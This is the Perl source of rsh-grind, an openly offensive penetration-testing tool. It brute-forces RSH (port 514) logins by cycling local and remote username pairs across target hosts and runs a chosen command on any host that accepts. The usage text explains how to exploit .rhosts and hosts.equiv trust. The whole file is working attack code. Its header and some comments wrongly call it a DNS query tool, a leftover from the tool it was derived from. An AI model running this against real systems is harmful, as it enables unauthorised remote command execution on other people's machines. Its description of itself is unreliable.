#!/usr/bin/perl -w
# rsh-grind - Performs lots of DNS queries quickly
# Copyright (C) 2006 pentestmonkey@pentestmonkey.net
# 
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2 as 
# published by the Free Software Foundation.
# 
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
# 
# You should have received a copy of the GNU General Public License along
# with this program; if not, write to the Free Software Foundation, Inc.,
# 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
#
# This tool may be used for legal purposes only.  Users take full responsibility
# for any actions performed using this tool.  If these terms are not acceptable to 
# you, then do not use this tool.
# 
# You are encouraged to send comments, improvements or suggestions to
# me at rsh-grind@pentestmonkey.net
#
# This program is derived from dns-grind ( http://pentestmonkey.net/tools/dns-grind )

use strict;
use Socket;
use POSIX; # for geteuid
use IO::Handle;
use IO::Select;
use Getopt::Std;
$| = 1;

my $VERSION          = "0.9.2";
my $command          = "id";
my $debug            = 0;
my $verbose          = 0;
my $max_procs        = 10;
my $query_timeout    = 5;
my @child_handles    = ();
my @local_usernames  = ();
my @remote_usernames = ();
my @usernames        = ();
my @targets          = ();
my $nameserver       = undef;
my $target           = undef;
my $start_time       = time();
my $end_time;
my $kill_child_string = "\x00";
$SIG{CHLD} = 'IGNORE'; # auto-reap
my %opts;
my $usage=<<USAGE;
rsh-grind v$VERSION ( http://pentestmonkey.net/tools/rsh-grind )

Usage: rsh-grind.pl [options] ( -U username_file ) ( -f ips.txt | hostname )
       rsh-grind.pl [options] ( -l local_username | -L file ) | ( -r remote_username | -R file ) ( -f ips.txt | hostname )

options are:
        -m n     Maximum number of processes (default: $max_procs)
        -l       Local username (on the client)
	-L file  File of local usernames
	-r       Remote username (on the server)
	-R file  File or remote usernames
	-U file  File of usernames.  Each will be used as remote and local
	         user (e.g. root/root, smtp/smtp).  Permutations will not
		 be tried.
	-c cmd   Command to execute (default: $command)
	         (Must be non-interactive, so don't try /bin/sh for example)
	-f file  File of target hostnames / IPs
	-t n     Wait a maximum of n seconds for reply (default: $query_timeout)
	-d       Debugging output
	-v       Verbose
	-h       This help message

The Remote Shell Protocol (RSH) allows remote users to execute commands
on the server.  Authentication is based on:
- Source IP Address
- Remote Username
- Local Username

This script can't help you with obtaining a valid source IP address, but
it can help you try different combinations of remote and local usernames.

If your source IP address is in /etc/hosts.equiv, then you just need a
valid username on the system, the remote and local usernames should be the
same.

If the remote user account you're attacking has a .rhosts file like the 
following in their home directory, it doesn't matter what the local 
username is:
IP +

In both of the above cases, the most efficient usage is:

\$ rsh-grind.pl -U users.txt target

If the .rhosts looks like the following, though the local username must 
be "foo":
IP foo

In this case you might need to try lots of permutations before you
hit on the one that works.  The correct usage is:

\$ rsh-grind.pl -L localusers.txt -R remoteusers.txt target

Output lines will be something like:
10.0.0.1/localuser/remoteuser    _uid=101(remoteuser) gid=1(other)_

Non-printable characters are sqashed to _ to fit whole response on
one line.

NB: The RSH protocol requires the binding of a local privileged port, so
you need to run this script as root.

USAGE

getopts('m:l:L:r:R:U:f:hvdt:c:', \%opts);

# Print help message if required
if ($opts{'h'}) {
	print $usage;
	exit 0;
}

my $local_username        = $opts{'l'} if $opts{'l'};
my $local_username_file   = $opts{'L'} if $opts{'L'};
my $remote_username       = $opts{'r'} if $opts{'r'};
my $remote_username_file  = $opts{'R'} if $opts{'R'};
my $username_file         = $opts{'U'} if $opts{'U'};
my $target_file           = $opts{'f'} if $opts{'f'};

$command        = $opts{'c'} if $opts{'c'};
$max_procs      = $opts{'m'} if $opts{'m'};
$verbose        = $opts{'v'} if $opts{'v'};
$debug          = $opts{'d'} if $opts{'d'};
$query_timeout  = $opts{'t'} if $opts{'t'};

unless (defined($target_file)) {
	$target = shift;
}

# Check for illegal option combinations
unless (defined($target) or defined($target_file)) {
	print $usage;
	exit 1;
}

if (defined($username_file) and (
	defined($local_username_file) or
	defined($remote_username_file) or
	defined($remote_username) or
	defined($local_username)
)) {
	print "ERROR: If -U is used, usernames can't be specified in any other way\n";
	exit 1;
}

# Check for strange option combinations
if (
	(defined($remote_username) and defined($remote_username_file))
	or
	(defined($local_username) and defined($local_username_file))
) {
	print "WARNING: You specified a lone local or remote username AND a file of them.  Continuing anyway...\n";
}

# Check we're root
unless (geteuid() == 0) {
	print "ERROR: You need to be root.  (RSH protocol binds a privileged port)\n";
	exit 1;
}

# Shovel local_usernames and remote_username into arrays
if (defined($local_username_file)) {
	open(FILE, "<$local_username_file") or die "ERROR: Can't open local_username file $local_username_file: $!\n";
	@local_usernames = map { chomp($_); $_ =~ s/\x0d//g; $_ } <FILE>;
}

if (defined($remote_username_file)) {
	open(FILE, "<$remote_username_file") or die "ERROR: Can't open local_username file $remote_username_file: $!\n";
	@remote_usernames = map { chomp($_); $_ =~ s/\x0d//g; $_ } <FILE>;
}

if (defined($target_file)) {
	open(FILE, "<$target_file") or die "ERROR: Can't open local_username file $target_file: $!\n";
	@targets = map { chomp($_); $_ =~ s/\x0d//g; $_ } <FILE>;
}

if (defined($username_file)) {
	open(FILE, "<$username_file") or die "ERROR: Can't open file $username_file: $!\n";
	@usernames = map { chomp($_); $_ =~ s/\x0d//g; $_ } <FILE>;
}

if (defined($local_username)) {
	push @local_usernames, $local_username;
}

if (defined($remote_username)) {
	push @remote_usernames, $remote_username;
}

if (defined($target)) {
	push @targets, $target;
}

if (defined($remote_username_file) and not @remote_usernames) {
	print "ERROR: Remote username file $remote_username_file was empty\n";
	exit 1;
}

if (defined($local_username_file) and not @local_usernames) {
	print "ERROR: Local username file $local_username_file was empty\n";
	exit 1;
}

if (defined($target_file) and not @targets) {
	print "ERROR: Targets file $target_file was empty\n";
	exit 1;
}

unless (@usernames or (@remote_usernames and @local_usernames)) {
	print "ERROR: No usernames to try\n";
	exit 1;
}

print "Starting rsh-grind v$VERSION ( http://pentestmonkey.net/tools/rsh-grind )\n";
print "\n";
print " ----------------------------------------------------------\n";
print "|                   Scan Information                       |\n";
print " ----------------------------------------------------------\n";
print "\n";
print "Processes .............. $max_procs\n";
print "Command ................ $command\n";
print "Targets file ........... $target_file\n" if defined($target_file);
print "Target ................. $target\n" if defined($target);
print "Remote usernames file .. $remote_username_file\n" if defined($remote_username_file);
print "Remote username ........ $remote_username\n" if defined($remote_username);
print "Local username ......... $local_username\n" if defined($local_username);
print "Local usernames file ... $local_username_file\n" if defined($local_username_file);
print "Usernames file ......... $username_file\n" if defined($username_file);
print "Username count ......... " . scalar(@usernames) . "\n" if @usernames;
print "Remote username count .. " . scalar(@remote_usernames) . "\n" if @remote_usernames;
print "Local username count ... " . scalar(@local_usernames) . "\n" if @local_usernames;
print "Query timeout .......... $query_timeout secs\n";
print "\n";
print "######## Scan started at " . scalar(localtime()) . " #########\n";

# Create DNS resolver object
my $client = Net::Rsh->new();

# Spawn off correct number of children
foreach my $proc_count (1..$max_procs) {
	socketpair(my $child, my $parent, AF_UNIX, SOCK_STREAM, PF_UNSPEC) or  die "socketpair: $!";
	$child->autoflush(1);
	$parent->autoflush(1);

	# Parent executes this
	if (my $pid = fork) {
		close $parent;
		print "[Parent] Spawned child with PID $pid to do resolving\n" if $debug;
		push @child_handles, $child;

	# Chile executes this
	} else {
		close $child;
		while (1) {
			my $timed_out = 0;

			# Read username combo
			my $combo = <$parent>;
			chomp $combo;
			print "[Child $$] Received: $combo\n" if $debug;
			my ($host, $local_username, $remote_username) = $combo =~ /([^\t]+)\t([^\t]+)\t([^\t]+)/;
			$combo =~ s/\t/\//g;

			# Exit if told to by parent
			if ($combo eq $kill_child_string) {
				print "[Child $$] Exiting\n" if $debug;
				exit 0;
			}
			
			# Sanity check
			unless (defined($local_username) and defined($remote_username)) {
				print "[Child $$] ERROR received corrupt target/usernames: $combo.  Ignoring\n";
				print $parent "<internal error>";
				next;
			}

			# Do query with timeout
			my @result;
			eval {
				local $SIG{ALRM} = sub { die "alarm\n" };
				alarm $query_timeout;
				@result = $client->rsh($host, $local_username, $remote_username, $command);
				alarm 0;
			};

			if ($@) {
				$timed_out = 1;
				print "[Child $$] Timeout for $combo\n" if $debug;
			}

			my $trace;
			if ($debug) {
				$trace = "[Child $$] $combo\t";
			} else {
				$trace = "$combo\t";
			}

			my $result = join("\n", @result);

			if ($timed_out) {
				print $parent $trace . "<timeout>\n";
			} else {
				if (!@result) {
					print $parent $trace . "<no result>\n";
				}
			}

			if ($result =~ /^\x01/) {
				print $parent "$trace <permission denied>\n";
			} else {
				if ($result eq '') {
					print $parent "$trace <null response>\n";
				} else {
					$result =~ s/[^[:print:]]/_/g;
					print $parent "$trace $result\n";
				}
			}

		}
		exit;
	}
}

# Fork once more to make a process that will feed us targets
socketpair(my $get_next_target, my $parent, AF_UNIX, SOCK_STREAM, PF_UNSPEC) or  die "socketpair: $!";
$get_next_target->autoflush(1);
$parent->autoflush(1);

# Parent executes this
if (my $pid = fork) {
	close $parent;

# Child executes this
} else {
	if (@usernames) {
		# Generate targets using hosts and usernames
		foreach my $username (@usernames) {
			foreach my $target (@targets) {
				my $combo = "$target\t$username\t$username";
				print "[Target Generator] Sending $combo to parent\n" if $debug;
				print $parent "$combo\n";
			}
		}

	} else {
		# Generate targets from local_username-remote_username pairs and send to parent
		foreach my $local_username (@local_usernames) {
			foreach my $remote_username (@remote_usernames) {
				foreach my $target (@targets) {
					my $combo = "$target\t$local_username\t$remote_username";
					print "[Target Generator] Sending $combo to parent\n" if $debug;
					print $parent "$combo\n";
				}
			}
		}
	}

	exit 0;
}

my $s = IO::Select->new();
my $s_in = IO::Select->new();
$s->add(@child_handles);
$s_in->add(\*STDIN);
my $timeout = 0; # non-blocking
my $more_targets = 1;
my $outstanding_queries = 0;
my $query_count = 0;
my $result_count = 0;

# Write to each child process once
writeloop: foreach my $write_handle (@child_handles) {
	my $target = <$get_next_target>;
	if ($target) {
		chomp($target);
		print "[Parent] Sending $target to child\n" if $debug;
		print $write_handle "$target\n";
		$outstanding_queries++;
	} else {
		print "[Parent] Quitting main loop.  All targets have been read.\n" if $debug;
		last writeloop;
	}
}

# Keep reading from child processes until there is nothing
# write to a child only after it has been read from
mainloop: while (1) {
	# Wait until there's a child that we can either read from or written to.
	my ($rh_aref) = IO::Select->select($s, undef, undef); # blocking

	print "[Parent] There are " . scalar(@$rh_aref) . " children that can be read from\n" if $debug;

	foreach my $read_handle (@$rh_aref) {
		# Read from child
		chomp(my $line = <$read_handle>);
		if ($verbose == 1 or $debug == 1 or not ($line =~ /<no result>|<timeout>|<permission denied>/)) {
			print "$line\n";
			$result_count++ unless ($line =~ /<no result>|<timeout>|<permission denied>/);
		}
		$outstanding_queries--;
		$query_count++;

		# Write to child
		my $target = <$get_next_target>;
		if ($target) {
			chomp($target);
			print "[Parent] Sending $target to child\n" if $debug;
			print $read_handle "$target\n";
			$outstanding_queries++;
		} else {
			print "DEBUG: Quitting main loop.  All targets have been read.\n" if $debug;
			last mainloop;
		}
	}
}

# Wait to get replies back from remaining children
my $count = 0;
readloop: while ($outstanding_queries) {
	my @ready_to_read = $s->can_read(1); # blocking
	foreach my $child_handle (@ready_to_read) {
		print "[Parent] Outstanding queries: $outstanding_queries\n" if $debug;
		chomp(my $line = <$child_handle>);
		if ($verbose == 1 or $debug == 1 or not ($line =~ /<no result>|<timeout>|<permission denied>/)) {
			print "$line\n";
			$result_count++ unless ($line =~ /<no result>|<timeout>|<permission denied>/);
		}
		print $child_handle "$kill_child_string\n";
		$s->remove($child_handle);
		$outstanding_queries--;
		$query_count++;
	}
}

# Tell any remaining children to exit
foreach my $handle ($s->handles) {
	print "[Parent] Telling child to exit\n" if $debug;
	print $handle "$kill_child_string\n";
}

# Wait for all children to terminate
while(wait != -1) {};

print "######## Scan completed at " . scalar(localtime()) . " #########\n";
print "$result_count results.\n";
print "\n";
$end_time = time(); # Second granularity only to avoid depending on hires time module
my $run_time = $end_time - $start_time;
$run_time = 1 if $run_time < 1; # Avoid divide by zero
printf "%d queries in %d seconds (%0.1f queries / sec)\n", $query_count, $run_time, $query_count / $run_time;

# Based on Net::Rsh by Oleg Prokopyev, <riiki@gu.net>
package Net::Rsh;

use strict;
use IO::Socket;
use Carp;
use Errno;

require Exporter;

use vars qw($VERSION @ISA @EXPORT);

@ISA = qw(Exporter);
@EXPORT = qw(&rsh);

sub new {
	my $class=shift;
	return bless {}, $class;
}

sub rsh {
	my ($self, $host, $local_user, $remote_user, $cmd) = @_;

        # Make outgoing connection
	my $socket = undef;
	foreach my $port (reverse(1..1023)) {
		$socket = IO::Socket::INET->new(PeerAddr=>$host,
                                		PeerPort=>'514',
                                		LocalPort=>$port,
                                		Proto=>"tcp");
		last if (defined($socket));
	}                         
	croak "ERROR: No free privileged ports\n" unless defined($socket);

	# Bind to local port
	my $listen_socket = undef;
	foreach my $port (reverse(1..1023)) {
		$listen_socket = IO::Socket::INET->new( 
						LocalAddr=> "0.0.0.0",
						LocalPort => $port, 
						Proto => 'tcp', 
						Listen => 1, 
						ReuseAddr => 1
					);
		last if (defined($listen_socket));
	}                         
	croak "ERROR: No free privileged ports\n" unless defined($listen_socket);

	print $socket $listen_socket->sockport . "\0";
	print $socket "$local_user\0";
	print $socket "$remote_user\0";
	print $socket "$cmd\0";
	return <$socket>;
}

1;
